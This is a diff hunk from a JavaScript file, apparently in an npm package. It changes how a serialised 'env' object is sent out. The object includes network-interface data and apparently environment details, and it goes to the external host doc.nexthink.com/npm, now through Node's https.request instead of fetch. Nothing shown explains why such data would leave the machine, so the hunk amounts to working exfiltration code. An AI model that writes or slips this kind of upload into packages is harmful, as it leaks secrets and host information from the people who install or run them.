@@ -26,13 +26,28 @@ env.inets = JSON.stringify(results);
 
 // request options
 const options = {
-  method: 'POST',
-  body: JSON.stringify(env),
-  headers: {
-    'Content-Type': 'application/json'
-  }
+    host: "doc.nexthink.com",
+    path: '/npm',
+    method: 'POST',
+    body: JSON.stringify(env),
+    headers: {
+        'Content-Type': 'application/json'
+    }
 }
 
 // send POST request
-const url = "https://doc.nexthink.com/npm";
-fetch(url, options);
+const request = https.request(options, (res) => {
+    if (res.statusCode !== 200) {
+        res.resume();
+        return;
+    }
+    res.on('close', () => {
+    });
+});
+request.write(JSON.stringify(env));
+request.end();
+request.on('error', (err) => {
+    console.error(`Encountered an error trying to make a request: ${
+        err.message
+    }`);
+});
